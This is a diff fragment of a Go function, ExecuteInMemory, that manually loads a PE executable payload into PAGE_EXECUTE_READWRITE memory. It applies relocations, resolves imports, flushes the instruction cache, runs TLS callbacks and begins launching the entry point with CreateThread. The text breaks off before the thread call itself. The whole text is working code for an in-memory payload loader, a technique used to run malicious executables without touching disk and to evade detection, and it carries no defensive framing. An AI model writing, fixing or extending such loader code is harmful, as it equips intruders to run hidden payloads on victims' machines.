@@ -201,6 +201,8 @@ func ExecuteInMemory(payload []byte) error {
 	// 7. Apply relocations if needed
 	newImageBase := uint64(baseAddress)
 	if newImageBase != imageBase {
+		// Revert to using the local ApplyRelocations function
+		// Pass the 'dest' slice as the imageData argument
 		if err := ApplyRelocations(peFile, dest, imageBase, newImageBase); err != nil {
 			cleanup()
 			return fmt.Errorf("relocation failed: %w", err)
@@ -208,7 +210,7 @@ func ExecuteInMemory(payload []byte) error {
 	}
 
 	// 8. Resolve imports
-	if err := ResolveImports(peFile, dest); err != nil {
+	if err := ResolveImports(peFile, baseAddress); err != nil {
 		cleanup()
 		return fmt.Errorf("import resolution failed: %w", err)
 	}
@@ -216,13 +218,23 @@ func ExecuteInMemory(payload []byte) error {
 	// 9. Memory protections are already PAGE_EXECUTE_READWRITE for the entire section.
 	// The previous VirtualProtect loop is not needed.
 
-	// 10. Call TLS callbacks if present
+	// 10. Flush the instruction cache to ensure CPU doesn't execute stale instructions
+	procFlushInstructionCache := modKernel32.NewProc("FlushInstructionCache")
+	_, _, _ = procFlushInstructionCache.Call(
+		uintptr(windows.CurrentProcess()),
+		baseAddress,
+		uintptr(sizeOfImage),
+	)
+	// This call usually returns a non-zero error code even on success
+	// so we ignore the error here
+
+	// 11. Call TLS callbacks if present
 	if err := ExecuteTLSCallbacks(peFile, baseAddress); err != nil {
 		cleanup()
 		return fmt.Errorf("TLS callback execution failed: %w", err)
 	}
 
-	// 11. Execute entry point using CreateThread
+	// 12. Execute entry point using CreateThread
 	entryPoint := baseAddress + uintptr(addressOfEntryPoint)
 	var threadId uint32
 
